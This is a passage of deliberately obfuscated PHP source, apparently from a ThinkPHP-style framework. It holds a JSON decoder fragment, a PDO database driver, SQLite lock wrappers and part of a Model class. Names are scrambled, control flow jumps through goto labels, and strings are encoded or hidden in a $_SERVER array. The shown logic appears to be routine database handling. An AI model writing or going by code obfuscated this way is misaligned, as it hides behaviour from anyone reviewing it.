($c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1401] && in_array($féö«ë§Õµ[$bÉŠÚ™´¹§[1397]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f””„À¾Á¦, array($bÉŠÚ™´¹§[1397] => SERVICES_JSON_IN_CMT, $bÉŠÚ™´¹§[267] => $dë÷–‘•á×, $bÉŠÚ™´¹§[1398] => !1)); $dë÷–‘•á×++; } elseif ($c„¥ºÊòô¤ == $bÉŠÚ™´¹§[1402] && $féö«ë§Õµ[$bÉŠÚ™´¹§[1397]] == SERVICES_JSON_IN_CMT) { array_pop($f””„À¾Á¦); $dë÷–‘•á×++; for ($FÈßæ¦œœ = $féö«ë§Õµ[$bÉŠÚ™´¹§[267]]; $FÈßæ¦œœ <= $dë÷–‘•á×; ++$FÈßæ¦œœ) { $a‰ÇÑ•ù¨¨ = substr_replace($a‰ÇÑ•ù¨¨, $bÉŠÚ™´¹§[50], $FÈßæ¦œœ, 1); } } } if (reset($f””„À¾Á¦) == SERVICES_JSON_IN_ARR) { return $bçºØ”ÒÖ¥; } elseif (reset($f””„À¾Á¦) == SERVICES_JSON_IN_OBJ) { return $Cñº—©ÎÈ½; } goto Aºà¡ƒîæˆ; f×º³‘Èë: $a‰ÇÑ•ù¨¨ = $this->reduce_string($a‰ÇÑ•ù¨¨); if ($a‰ÇÑ•ù¨¨ == $bÉŠÚ™´¹§[33]) { if (reset($f””„À¾Á¦) == SERVICES_JSON_IN_ARR) { return $bçºØ”ÒÖ¥; } else { return $Cñº—©ÎÈ½; } } $A°Æ“ „á = strlen($a‰ÇÑ•ù¨¨); goto aÑ…êé³òó; Aºà¡ƒîæˆ: } } } function isError($Föçî‰Ã†’, $a÷³˜¹Î³ = null) { $b­¹â’»™‰ =& $_SERVER[İë¬“ÅÒÛ›]; if (class_exists($b­¹â’»™‰[1403])) { return PEAR::isError($Föçî‰Ã†’, $a÷³˜¹Î³); } elseif (is_object($Föçî‰Ã†’) && (get_class($Föçî‰Ã†’) == $b­¹â’»™‰[1404] || is_subclass_of($Föçî‰Ã†’, $b­¹â’»™‰[1404]))) { return !0; } return !1; } } if (class_exists($_SERVER[İë¬“ÅÒÛ›][1405])) { class Services_JSON_Error extends PEAR_Error { function __construct($Fã¤øŒÍ­ = "\165\x6e\x6b\156\x6f\167\156\40\145\x72\x72\x6f\x72", $F¦Ê±—‘â = null, $D™ù½‡¬µ = null, $f¶ßãä¨Ÿ¼ = null, $F¢Š´í´á = null) { parent::PEAR_Error($Fã¤øŒÍ­, $F¦Ê±—‘â, $D™ù½‡¬µ, $f¶ßãä¨Ÿ¼, $F¢Š´í´á); } } } else { class Services_JSON_Error { function __construct($døÍŞÂˆò¬ = "\x75\156\x6b\x6e\x6f\167\x6e\40\x65\162\162\x6f\162", $Dçƒî ‰Ú— = null, $fÅæ˜ äÇ = null, $bËÚîÆÉ®“ = null, $Bˆóâ±¦ñø = null) { } } } goto a˜ÍÚ……†Á; F…ëÂ†ÎöÜ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($DíËÄß¡¹õ = '') { $C†Ûö÷õ˜ª =& $_SERVER[İë¬“ÅÒÛ›]; if (!class_exists($C†Ûö÷õ˜ª[596])) { think_exception(think_lang($C†Ûö÷õ˜ª[10]) . $C†Ûö÷õ˜ª[597]); } if (!empty($DíËÄß¡¹õ)) { $this->config = $DíËÄß¡¹õ; if (empty($this->config[$C†Ûö÷õ˜ª[13]])) { $this->config[$C†Ûö÷õ˜ª[13]] = array(); } } } public function connect($Fåİ­­“Š³ = '', $D‡ãØÔŠ‡Ï = 0) { $EÎÅ‚²Û¼ =& $_SERVER[İë¬“ÅÒÛ›]; if (!isset($this->linkID[$D‡ãØÔŠ‡Ï])) { goto FØ©Öï”º; DÙÃê¿ñß½: $this->linkID[$D‡ãØÔŠ‡Ï]->exec($EÎÅ‚²Û¼[607] . think_config($EÎÅ‚²Û¼[569])); $this->connected = !0; if (1 != think_config($EÎÅ‚²Û¼[18])) { unset($this->config); } goto FÛ¿Ü°ÉŞâ; C˜òÚ„õ: $this->dbType = $this->_getDsnType($Fåİ­­“Š³[$EÎÅ‚²Û¼[598]]); if (in_array($this->dbType, array($EÎÅ‚²Û¼[599], $EÎÅ‚²Û¼[600], $EÎÅ‚²Û¼[601], $EÎÅ‚²Û¼[602]))) { think_exception($EÎÅ‚²Û¼[603] . $this->dbType . $EÎÅ‚²Û¼[604] . $this->dbType . $EÎÅ‚²Û¼[605]); } if (!$this->linkID[$D‡ãØÔŠ‡Ï]) { think_exception($EÎÅ‚²Û¼[606]); } goto DÙÃê¿ñß½; FØ©Öï”º: if (empty($Fåİ­­“Š³)) { $Fåİ­­“Š³ = $this->config; } if ($this->pconnect) { $Fåİ­­“Š³[$EÎÅ‚²Û¼[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$D‡ãØÔŠ‡Ï] = new PDO($Fåİ­­“Š³[$EÎÅ‚²Û¼[598]], $Fåİ­­“Š³[$EÎÅ‚²Û¼[566]], $Fåİ­­“Š³[$EÎÅ‚²Û¼[567]], $Fåİ­­“Š³[$EÎÅ‚²Û¼[13]]); } catch (PDOException $AŒ¾ğ¾¢ä›) { think_exception($AŒ¾ğ¾¢ä›->getMessage()); } goto C˜òÚ„õ; FÛ¿Ü°ÉŞâ: } return $this->linkID[$D‡ãØÔŠ‡Ï]; } public function free() { $this->PDOStatement = null; } public function query($E˜îøÀ†±‘, $cŞÊ¡áÕò¹ = array()) { goto bøÓ‡…³°‡; C¢ÎÉÇ ĞÑ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $F¼Æ…ƒãÆ = $this->PDOStatement->execute($cŞÊ¡áÕò¹); $this->debug(); goto fâ»ƒŸÆ ƒ; bøÓ‡…³°‡: $F¬õÉæ‡• =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eó‹÷¤; Cåö‚éºÃ¸: think_action_status($F¬õÉæ‡•[19], 1); think_status($F¬õÉæ‡•[20]); $this->PDOStatement = $this->_linkID->prepare($E˜îøÀ†±‘); goto C¢ÎÉÇ ĞÑ; eó‹÷¤: $this->queryStr = $E˜îøÀ†±‘; if (!empty($cŞÊ¡áÕò¹)) { $this->queryStr .= $F¬õÉæ‡•[608] . print_r($cŞÊ¡áÕò¹, !0) . $F¬õÉæ‡•[609]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Cåö‚éºÃ¸; fâ»ƒŸÆ ƒ: if (!1 === $F¼Æ…ƒãÆ) { $this->error(); return !1; } else { return $this->getAll(); } goto e‚ÃÌŒ¬¹ë; e‚ÃÌŒ¬¹ë: } public function execute($E‹…Ó„“, $dæ¨ÙäëèÙ = array()) { goto Bõ’õšàš÷; Bõ’õšàš÷: $d½âÏ®ó¢¶ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¼¦ËÅï•È; Fñ–Àº…¡“: think_status($d½âÏ®ó¢¶[20]); $this->PDOStatement = $this->_linkID->prepare($E‹…Ó„“); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cèµø«Œê¡; EÃ·¶˜§ç: if ($this->dbType == $d½âÏ®ó¢¶[602]) { if (preg_match($d½âÏ®ó¢¶[610], $this->queryStr, $b•¸İˆíê)) { $this->table = think_config($d½âÏ®ó¢¶[611]) . str_ireplace(think_config($d½âÏ®ó¢¶[612]), $d½âÏ®ó¢¶[364], $b•¸İˆíê[2]); $câ©êÅÇ¦ğ = (bool) $this->query($d½âÏ®ó¢¶[613] . strtoupper($this->table) . $d½âÏ®ó¢¶[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($d½âÏ®ó¢¶[21], 1); goto Fñ–Àº…¡“; E¼¦ËÅï•È: $this->queryStr = $E‹…Ó„“; if (!empty($dæ¨ÙäëèÙ)) { $this->queryStr .= $d½âÏ®ó¢¶[608] . print_r($dæ¨ÙäëèÙ, !0) . $d½âÏ®ó¢¶[609]; } $câ©êÅÇ¦ğ = !1; goto EÃ·¶˜§ç; cèµø«Œê¡: $C…Ìèêã = $this->PDOStatement->execute($dæ¨ÙäëèÙ); $this->debug(); if (!1 === $C…Ìèêã) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($câ©êÅÇ¦ğ || preg_match($d½âÏ®ó¢¶[614], $E‹…Ó„“)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto DË¥åÙÖÏÆ; DË¥åÙÖÏÆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d’°‘ĞùÕ‡ = $this->_linkID->commit(); $this->transTimes = 0; if (!$d’°‘ĞùÕ‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b˜ŠÊãÊë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$b˜ŠÊãÊë) { $this->error(); return !1; } } return !0; } private function getAll() { $c·°Ô¨Æóç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c·°Ô¨Æóç); return $c·°Ô¨Æóç; } public function getFields($B—¹š½Ì’º) { goto EÕŞÚ­é„³; eŠÍ‘İƒ…: $fÈ¡š®¢Šõ = $this->query($Béğëê°Ï); $FÌî©æˆœ— = array(); if ($fÈ¡š®¢Šõ) { foreach ($fÈ¡š®¢Šõ as $EÎŸİ éçœ => $fÛÕò¾ÁÑÙ) { $fÛÕò¾ÁÑÙ = array_change_key_case($fÛÕò¾ÁÑÙ); $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[28]] = isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[28]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[28]] : $Cõ–Ã…º“[364]; $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[29]] = isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[29]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[29]] : $Cõ–Ã…º“[364]; $dä¤¤İ‚³¤ = isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[265]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[265]] : $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[28]]; $FÌî©æˆœ—[$dä¤¤İ‚³¤] = array($Cõ–Ã…º“[28] => $dä¤¤İ‚³¤, $Cõ–Ã…º“[29] => $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[29]], $Cõ–Ã…º“[31] => (bool) (isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[100]]) && $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[100]] === $Cõ–Ã…º“[33] || isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[31]]) && $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[31]] === $Cõ–Ã…º“[33]), $Cõ–Ã…º“[34] => isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[34]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[34]] : (isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[53]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[53]] : $Cõ–Ã…º“[364]), $Cõ–Ã…º“[36] => isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[88]]) ? strtolower($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[88]]) == $Cõ–Ã…º“[38] : (isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[54]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[54]] : !1), $Cõ–Ã…º“[39] => isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[631]]) ? strtolower($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[631]]) == $Cõ–Ã…º“[41] : (isset($fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[88]]) ? $fÛÕò¾ÁÑÙ[$Cõ–Ã…º“[88]] : !1)); } } goto Bˆˆ‰„œÏ‡; Bˆˆ‰„œÏ‡: return $FÌî©æˆœ—; goto A°Ó·è­Ê†; EÕŞÚ­é„³: $Cõ–Ã…º“ =& $_SERVER[İë¬“ÅÒÛ›]; $this->initConnect(!0); if (think_config($Cõ–Ã…º“[615])) { $Béğëê°Ï = str_replace($Cõ–Ã…º“[616], $B—¹š½Ì’º, think_config($Cõ–Ã…º“[615])); } else { switch ($this->dbType) { case $Cõ–Ã…º“[599]: case $Cõ–Ã…º“[617]: $Béğëê°Ï = "\123\x45\x4c\x45\103\124\x20\40\40\143\x6f\x6c\x75\x6d\x6e\137\156\x61\155\145\x20\x61\x73\x20\x27\116\141\x6d\x65\47\x2c\40\40\40\144\x61\164\141\137\x74\x79\160\145\x20\x61\x73\x20\47\124\x79\160\x65\47\x2c\x20\x20\40\x63\157\x6c\x75\155\x6e\x5f\144\x65\x66\x61\165\x6c\x74\x20\141\163\40\47\104\145\146\x61\165\154\x74\47\x2c\40\x20\x20\151\163\137\x6e\x75\x6c\154\141\142\154\x65\40\x61\163\40\x27\x4e\x75\x6c\154\x27\12\11\11\106\122\117\115\11\151\x6e\x66\157\x72\155\x61\x74\151\157\156\x5f\x73\143\150\x65\x6d\141\x2e\x74\x61\142\x6c\x65\163\40\x41\123\40\164\xa\x9\11\112\117\x49\116\x9\x69\156\146\x6f\x72\x6d\x61\x74\151\157\156\137\x73\x63\x68\145\x6d\141\56\x63\157\154\x75\x6d\156\163\40\101\123\x20\143\12\x9\11\x4f\116\40\40\x74\x2e\x74\x61\x62\154\x65\137\143\x61\164\x61\x6c\157\x67\40\75\x20\143\x2e\164\141\x62\154\x65\137\x63\141\164\141\154\x6f\x67\xa\11\x9\x41\x4e\x44\x20\164\56\164\141\142\x6c\x65\x5f\163\143\x68\145\x6d\x61\40\x3d\x20\x63\56\164\141\142\x6c\145\x5f\x73\x63\150\x65\x6d\x61\12\11\11\x41\116\x44\40\x74\x2e\164\141\x62\x6c\145\137\x6e\141\155\145\x20\x3d\x20\x63\x2e\x74\x61\142\x6c\145\x5f\x6e\x61\x6d\145\12\11\x9\x57\110\x45\x52\x45\40\40\40\164\x2e\x74\141\142\x6c\x65\x5f\156\x61\155\145\x20\x3d\x20\x27{$B—¹š½Ì’º}\47"; break; case $Cõ–Ã…º“[618]: $Béğëê°Ï = $Cõ–Ã…º“[619] . $B—¹š½Ì’º . $Cõ–Ã…º“[620]; break; case $Cõ–Ã…º“[600]: case $Cõ–Ã…º“[602]: $Béğëê°Ï = $Cõ–Ã…º“[621] . $Cõ–Ã…º“[622] . $Cõ–Ã…º“[623] . strtoupper($B—¹š½Ì’º) . $Cõ–Ã…º“[624] . strtoupper($B—¹š½Ì’º) . $Cõ–Ã…º“[625]; break; case $Cõ–Ã…º“[626]: $Béğëê°Ï = $Cõ–Ã…º“[627] . $B—¹š½Ì’º . $Cõ–Ã…º“[628]; break; case $Cõ–Ã…º“[601]: break; case $Cõ–Ã…º“[629]: default: $Béğëê°Ï = $Cõ–Ã…º“[630] . ($this->dbType == $Cõ–Ã…º“[629] ? "\140{$B—¹š½Ì’º}\x60" : $B—¹š½Ì’º); } } goto eŠÍ‘İƒ…; A°Ó·è­Ê†: } public function getTables($dœ†Éá‚› = '') { $bÍÂ‰Ìøˆ =& $_SERVER[İë¬“ÅÒÛ›]; if (think_config($bÍÂ‰Ìøˆ[632])) { $BÙâ³éÏõ = str_replace($bÍÂ‰Ìøˆ[633], $dœ†Éá‚›, think_config($bÍÂ‰Ìøˆ[632])); } else { switch ($this->dbType) { case $bÍÂ‰Ìøˆ[600]: case $bÍÂ‰Ìøˆ[602]: $BÙâ³éÏõ = $bÍÂ‰Ìøˆ[634]; break; case $bÍÂ‰Ìøˆ[599]: case $bÍÂ‰Ìøˆ[617]: $BÙâ³éÏõ = $bÍÂ‰Ìøˆ[635]; break; case $bÍÂ‰Ìøˆ[626]: $BÙâ³éÏõ = $bÍÂ‰Ìøˆ[636]; break; case $bÍÂ‰Ìøˆ[601]: think_exception(think_lang($bÍÂ‰Ìøˆ[637]) . $bÍÂ‰Ìøˆ[638]); break; case $bÍÂ‰Ìøˆ[618]: $BÙâ³éÏõ = $bÍÂ‰Ìøˆ[42] . $bÍÂ‰Ìøˆ[43] . $bÍÂ‰Ìøˆ[44]; break; case $bÍÂ‰Ìøˆ[629]: default: if (!empty($dœ†Éá‚›)) { $BÙâ³éÏõ = $bÍÂ‰Ìøˆ[577] . $dœ†Éá‚›; } else { $BÙâ³éÏõ = $bÍÂ‰Ìøˆ[578]; } } } $Fó˜İ–ÛÛ = $this->query($BÙâ³éÏõ); $AÎñ­Ë¥ÑÁ = array(); foreach ($Fó˜İ–ÛÛ as $BÄ˜Ùë™½ => $DĞêŸ›ÓÒŒ) { $AÎñ­Ë¥ÑÁ[$BÄ˜Ùë™½] = current($DĞêŸ›ÓÒŒ); } return $AÎñ­Ë¥ÑÁ; } protected function parseLimit($eöœƒğ°³Ä) { $eÅêÓç§³¨ =& $_SERVER[İë¬“ÅÒÛ›]; $b¾ĞØš„ = $eÅêÓç§³¨[33]; if (!empty($eöœƒğ°³Ä)) { switch ($this->dbType) { case $eÅêÓç§³¨[626]: case $eÅêÓç§³¨[618]: $eöœƒğ°³Ä = explode($eÅêÓç§³¨[47], $eöœƒğ°³Ä); if (count($eöœƒğ°³Ä) > 1) { $b¾ĞØš„ .= $eÅêÓç§³¨[48] . $eöœƒğ°³Ä[1] . $eÅêÓç§³¨[49] . $eöœƒğ°³Ä[0] . $eÅêÓç§³¨[50]; } else { $b¾ĞØš„ .= $eÅêÓç§³¨[48] . $eöœƒğ°³Ä[0] . $eÅêÓç§³¨[50]; } break; case $eÅêÓç§³¨[599]: case $eÅêÓç§³¨[617]: break; case $eÅêÓç§³¨[601]: break; case $eÅêÓç§³¨[600]: case $eÅêÓç§³¨[602]: break; case $eÅêÓç§³¨[629]: default: $b¾ĞØš„ .= $eÅêÓç§³¨[48] . $eöœƒğ°³Ä . $eÅêÓç§³¨[50]; } } return $b¾ĞØš„; } public function parseKey(&$FÚë‹—òšà, $BæõÓ¿î¥ç = true) { $eİ·ö¨àŸå =& $_SERVER[İë¬“ÅÒÛ›]; if ($BæõÓ¿î¥ç) { $FÚë‹—òšà = $this->parseKeyCheck($FÚë‹—òšà); } if ($this->dbType == $eİ·ö¨àŸå[629]) { if ($FÚë‹—òšà != $eİ·ö¨àŸå[173] && !preg_match($eİ·ö¨àŸå[588], $FÚë‹—òšà)) { $FÚë‹—òšà = $eİ·ö¨àŸå[589] . trim($FÚë‹—òšà, $eİ·ö¨àŸå[589]) . $eİ·ö¨àŸå[589]; } return $FÚë‹—òšà; } else { return parent::parseKey($FÚë‹—òšà); } } public function close() { $this->_linkID = null; } public function error() { $Bø†À¿‘‘ =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->PDOStatement) { $C„×ÏÔåˆ¥ = $this->PDOStatement->errorInfo(); $this->error = $C„×ÏÔåˆ¥[1] . $Bø†À¿‘‘[4] . $C„×ÏÔåˆ¥[2]; } else { $this->error = $Bø†À¿‘‘[33]; } if ($Bø†À¿‘‘[33] != $this->queryStr) { $this->error .= LNG($Bø†À¿‘‘[45]) . $this->queryStr; } think_trace($this->error, $Bø†À¿‘‘[33], $Bø†À¿‘‘[46]); return $this->error; } public function escapeString($d‹ä•ÉÒ) { $C¼™‚Ö‚Úæ =& $_SERVER[İë¬“ÅÒÛ›]; switch ($this->dbType) { case $C¼™‚Ö‚Úæ[626]: case $C¼™‚Ö‚Úæ[599]: case $C¼™‚Ö‚Úæ[617]: case $C¼™‚Ö‚Úæ[629]: return addslashes($d‹ä•ÉÒ); case $C¼™‚Ö‚Úæ[601]: case $C¼™‚Ö‚Úæ[618]: case $C¼™‚Ö‚Úæ[600]: case $C¼™‚Ö‚Úæ[602]: return str_ireplace($C¼™‚Ö‚Úæ[55], $C¼™‚Ö‚Úæ[56], $d‹ä•ÉÒ); } } protected function parseValue($e«ø¢™´Ùœ) { $CÒœğ¿»±¤ =& $_SERVER[İë¬“ÅÒÛ›]; if (is_string($e«ø¢™´Ùœ)) { $e«ø¢™´Ùœ = strpos($e«ø¢™´Ùœ, $CÒœğ¿»±¤[4]) === 0 ? $this->escapeString($e«ø¢™´Ùœ) : $CÒœğ¿»±¤[639] . $this->escapeString($e«ø¢™´Ùœ) . $CÒœğ¿»±¤[639]; } elseif (isset($e«ø¢™´Ùœ[0]) && is_string($e«ø¢™´Ùœ[0]) && strtolower($e«ø¢™´Ùœ[0]) == $CÒœğ¿»±¤[289]) { $e«ø¢™´Ùœ = $this->escapeString($e«ø¢™´Ùœ[1]); } elseif (is_array($e«ø¢™´Ùœ)) { $e«ø¢™´Ùœ = array_map(array($this, $CÒœğ¿»±¤[640]), $e«ø¢™´Ùœ); } elseif (is_bool($e«ø¢™´Ùœ)) { $e«ø¢™´Ùœ = $e«ø¢™´Ùœ ? $CÒœğ¿»±¤[377] : $CÒœğ¿»±¤[403]; } elseif (is_null($e«ø¢™´Ùœ)) { $e«ø¢™´Ùœ = $CÒœğ¿»±¤[100]; } return $e«ø¢™´Ùœ; } public function getLastInsertId() { $CîÆƒÓ« =& $_SERVER[İë¬“ÅÒÛ›]; switch ($this->dbType) { case $CîÆƒÓ«[626]: case $CîÆƒÓ«[618]: case $CîÆƒÓ«[599]: case $CîÆƒÓ«[617]: case $CîÆƒÓ«[601]: case $CîÆƒÓ«[629]: return $this->_linkID->lastInsertId(); case $CîÆƒÓ«[600]: case $CîÆƒÓ«[602]: $BÂ¹çÏ™Ò¼ = $this->table; $aÕ Ù×¼µÒ = $this->query("\x53\x45\114\105\103\124\40{$BÂ¹çÏ™Ò¼}\x2e\x63\x75\x72\x72\166\x61\154\x20\143\x75\x72\162\x76\141\154\40\106\x52\117\x4d\x20\144\x75\141\154"); return $aÕ Ù×¼µÒ ? $aÕ Ù×¼µÒ[0][$CîÆƒÓ«[641]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($aíÑ‹®Ôà) { goto a ¬çŒ¨; F°Ä…£¨ÑÅ: if (flock($Fù½±Ô­¼Í, LOCK_EX)) { $CìØ¿¸İéä = parent::query($aíÑ‹®Ôà); flock($Fù½±Ô­¼Í, LOCK_UN); fclose($Fù½±Ô­¼Í); return $CìØ¿¸İéä; } flock($Fù½±Ô­¼Í, LOCK_UN); fclose($Fù½±Ô­¼Í); goto DåØÎœå; a ¬çŒ¨: $FäùÑÉ¦‹ =& $_SERVER[İë¬“ÅÒÛ›]; $cÎ˜Ñ‰¹Å¤ = DATA_PATH . $FäùÑÉ¦‹[642]; $Fù½±Ô­¼Í = fopen($cÎ˜Ñ‰¹Å¤, $FäùÑÉ¦‹[643]); goto F°Ä…£¨ÑÅ; DåØÎœå: show_json($FäùÑÉ¦‹[644], !1); return !1; goto eî¨ï´ª¦Å; eî¨ï´ª¦Å: } public function execute($döŒí²¿¢â) { goto A™ƒÍ—ÖÒÂ; A™ƒÍ—ÖÒÂ: $D ì¹ÚÌ =& $_SERVER[İë¬“ÅÒÛ›]; $fºËõÀ¯í‰ = DATA_PATH . $D ì¹ÚÌ[642]; $B¨é®éÈ‘« = fopen($fºËõÀ¯í‰, $D ì¹ÚÌ[643]); goto aæãã¼ñ†ù; aæãã¼ñ†ù: if (flock($B¨é®éÈ‘«, LOCK_EX)) { $a¸®ƒ²’Šì = parent::execute($döŒí²¿¢â); flock($B¨é®éÈ‘«, LOCK_UN); fclose($B¨é®éÈ‘«); return $a¸®ƒ²’Šì; } flock($B¨é®éÈ‘«, LOCK_UN); fclose($B¨é®éÈ‘«); goto cì¨ùˆß‘´; cì¨ùˆß‘´: show_json($D ì¹ÚÌ[644], !1); return !1; goto Bæ®×Äƒ; Bæ®×Äƒ: } } class DbSqlite3 extends DbSqlite3Base { public function query($B¶Ã¾»ÂØ) { goto d‰å¨ ÈÈÎ; aÑÄîÛÛÓ˜: show_json($C¼å´‡–ŒÌ[644], !1); return !1; goto bé×İÆÍå; d‰å¨ ÈÈÎ: $C¼å´‡–ŒÌ =& $_SERVER[İë¬“ÅÒÛ›]; $Dâ—·’ğ•º = DATA_PATH . $C¼å´‡–ŒÌ[642]; $F±ÙáÛïªŠ = fopen($Dâ—·’ğ•º, $C¼å´‡–ŒÌ[643]); goto E®ƒ§ÑË‡; E®ƒ§ÑË‡: if (flock($F±ÙáÛïªŠ, LOCK_EX)) { $BæÚë Š„Œ = parent::query($B¶Ã¾»ÂØ); flock($F±ÙáÛïªŠ, LOCK_UN); fclose($F±ÙáÛïªŠ); return $BæÚë Š„Œ; } flock($F±ÙáÛïªŠ, LOCK_UN); fclose($F±ÙáÛïªŠ); goto aÑÄîÛÛÓ˜; bé×İÆÍå: } public function execute($BŠ­¦ğ§ô) { goto Aè‹¬¤È„; bÎÁğíö™‰: show_json($C“Ûæ©á¸[644], !1); return !1; goto D†ÅÇÂêô„; c«§šÙêè×: if (flock($DÓ±’ìøâ, LOCK_EX)) { $A‰¥µ¿Ñæ¨ = parent::execute($BŠ­¦ğ§ô); flock($DÓ±’ìøâ, LOCK_UN); fclose($DÓ±’ìøâ); return $A‰¥µ¿Ñæ¨; } flock($DÓ±’ìøâ, LOCK_UN); fclose($DÓ±’ìøâ); goto bÎÁğíö™‰; Aè‹¬¤È„: $C“Ûæ©á¸ =& $_SERVER[İë¬“ÅÒÛ›]; $AŠ¥ïÜ‡ƒ« = DATA_PATH . $C“Ûæ©á¸[642]; $DÓ±’ìøâ = fopen($AŠ¥ïÜ‡ƒ«, $C“Ûæ©á¸[643]); goto c«§šÙêè×; D†ÅÇÂêô„: } } goto A®Øƒ±´â; FÑÎ‡Ôğò: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\x65", "\x6f\x72\x64\145\162", "\x61\x6c\151\141\x73", "\x68\141\x76\x69\156\x67", "\147\x72\157\165\160", "\154\x6f\x63\x6b", "\144\x69\163\x74\151\156\x63\164", "\x61\165\x74\x6f", "\146\x69\x6c\x74\145\162", "\x76\x61\154\151\144\141\164\x65", "\x72\x65\x73\x75\x6c\164", "\142\x69\x6e\144", "\x74\x6f\x6b\145\x6e"); public function __construct($aåâºÃŞË¥ = '', $D§äˆ¬Âº = '', $F‹Ü½ø¯¬İ = '') { $E¾ §–Ó» =& $_SERVER[İë¬“ÅÒÛ›]; $this->_initialize(); if (!empty($aåâºÃŞË¥)) { if (strpos($aåâºÃŞË¥, $E¾ §–Ó»[92])) { list($this->dbName, $this->name) = explode($E¾ §–Ó»[92], $aåâºÃŞË¥); } else { $this->name = $aåâºÃŞË¥; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($D§äˆ¬Âº)) { $this->tablePrefix = $E¾ §–Ó»[33]; } elseif ($E¾ §–Ó»[33] != $D§äˆ¬Âº) { $this->tablePrefix = $D§äˆ¬Âº; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E¾ §–Ó»[236]); } $this->db(0, empty($this->connection) ? $F‹Ü½ø¯¬İ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Bˆ¥‹½òÊ¨ =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($this->fields)) { if (think_config($Bˆ¥‹½òÊ¨[237])) { $F–‡‚ğÄ©× = $this->dbName ? $this->dbName : think_config($Bˆ¥‹½òÊ¨[238]); $d¢‡‘ ‰ùî = think_var_cache($Bˆ¥‹½òÊ¨[239] . strtolower(get_path_this($F–‡‚ğÄ©×) . $Bˆ¥‹½òÊ¨[92] . $this->name)); if ($d¢‡‘ ‰ùî) { $eÍ¢ÌäÀ­ = think_config($Bˆ¥‹½òÊ¨[240]); if (empty($eÍ¢ÌäÀ­) || $d¢‡‘ ‰ùî[$Bˆ¥‹½òÊ¨[241]] == $eÍ¢ÌäÀ­) { $this->fields = $d¢‡‘ ‰ùî; return; } } } $this->flush(); } } public function flush() { goto b¾²¡ôËã; Fî‰†½¥ÁØ: foreach ($Bçõ‚‚›°ó as $EÓ‚¸„œô => $Cñ˜ ¨‹‚) { $d‘Ş¥ğ–îÕ[$EÓ‚¸„œô] = $Cñ˜ ¨‹‚[$Fò”†ââõÄ[29]]; if ($Cñ˜ ¨‹‚[$Fò”†ââõÄ[36]]) { $this->fields[$Fò”†ââõÄ[243]] = $EÓ‚¸„œô; if ($Cñ˜ ¨‹‚[$Fò”†ââõÄ[39]]) { $this->fields[$Fò”†ââõÄ[242]] = !0; } } } $this->fields[$Fò”†ââõÄ[244]] = $d‘Ş¥ğ–îÕ; if (think_config($Fò”†ââõÄ[240])) { $this->fields[$Fò”†ââõÄ[241]] = think_config($Fò”†ââõÄ[240]); } goto Dî†éÛ°š½; Dî†éÛ°š½: if (think_config($Fò”†ââõÄ[237])) { $bìåÈÕõì = $this->dbName ? $this->dbName : think_config($Fò”†ââõÄ[238]); think_var_cache($Fò”†ââõÄ[239] . strtolower(get_path_this($bìåÈÕõì) . $Fò”†ââõÄ[92] . $this->name), $this->fields); } goto E¥Ãø”ÉÖ; b¾²¡ôËã: $Fò”†ââõÄ =& $_SERVER[İë¬“ÅÒÛ›]; 